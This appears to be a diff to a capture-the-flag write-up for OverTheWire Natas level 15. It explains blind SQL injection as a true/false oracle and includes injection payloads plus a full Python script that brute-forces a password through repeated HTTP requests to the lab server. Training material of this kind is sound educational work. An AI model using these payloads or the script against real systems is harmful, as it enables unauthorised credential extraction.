@@ -175,9 +175,13 @@ SELECT * from users where username="natas16" AND BINARY SUBSTRING(password, 1, 1
 
 ![This user exists](images/level_15/03_user_yes.png)
 
-Hooray! The first letter of the password is "h". Now to start guessing the
-second letter of the password. One way is to extend the `SUBSTRING` to two
-characters, such as the "username" of
+Hooray! The first letter of the password is "h". This sort of vulnerability is
+known as an "oracle" (small "o"!) vulnerability, where the behaviour of the site
+can be used to leak small true / false bits of data. False that the password
+starts with "a", "b", "c", etc, and true that it starts with "h".
+
+Now to start guessing the second letter of the password. One way is to extend
+the `SUBSTRING` to two characters, such as the "username" of
 `natas16" AND BINARY SUBSTRING(password, 1, 2) = "ha` which results in the SQL:
 
 ```sql
@@ -227,15 +231,13 @@ entered by the user. In Python this looks like:
 ```python
 import getpass
 
-USERNAME = "natas15"
-password = getpass.getpass(prompt=f'Enter password for {USERNAME}: ')
+password = getpass.getpass(prompt='Enter password for natas15: ')
 ```
 
 #### Step 2: Loop over the password length
 
-First set u[ a variable to hold the correctly-guessed part of the password, and
+First set up a variable to hold the correctly-guessed part of the password, and
 then do the loop for 0 to 31.
-]
 
 ```python
 correct_guesses = ""
@@ -261,6 +263,8 @@ sqli = f'natas16" AND BINARY SUBSTRING(password, 1, { len(password_guess) }) = "
 #### Step 5: Web Server Request
 
 ```python
+import requests
+
 response = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=("natas15", password), data={ "username": sqli })
 ```
 
@@ -281,7 +285,7 @@ import getpass
 import requests
 
 # Step 1: Credentials
-password = getpass.getpass(prompt=f'Enter password for natas15: ')
+password = getpass.getpass(prompt='Enter password for natas15: ')
 
 # Step 2: Loop over the password length
 correct_guesses = ""
@@ -296,13 +300,16 @@ for i in range(0, 32):
         # Step 5: Web Server Request
         response = requests.post('http://natas15.natas.labs.overthewire.org/index.php', auth=("natas15", password), data={ "username": sqli })
 
-        # Step 6
+        # Step 6: Response Handling
         if 'This user exists' in response.text:
             correct_guesses += char
             break
         elif 'This user doesn\'t exist' not in response.text:
             print('Error:' + response.text)
 ```
+
+Running this command, and waiting for many HTTP requests, produces the
+`natas16` password.
 
 ## Key Takeaways
 
@@ -341,3 +348,9 @@ average 13 + 1 guesses to do the whole alphabet.
 The file [solution_optimized.py](files/level_15/solution_optimized.py) provides
 this solution. The unoptimized solution needed ~1000 HTTP requests, but this
 optimized solution needs fewer than 600 HTTP requests.
+
+### Other Queries
+
+Level 16 is a similar problem and one solution is to just match the start of
+the password. So instead of `SUBSTRING` for this challenge, `LIKE "a%"`
+could be used instead - it makes the code a little simpler, but too late now!
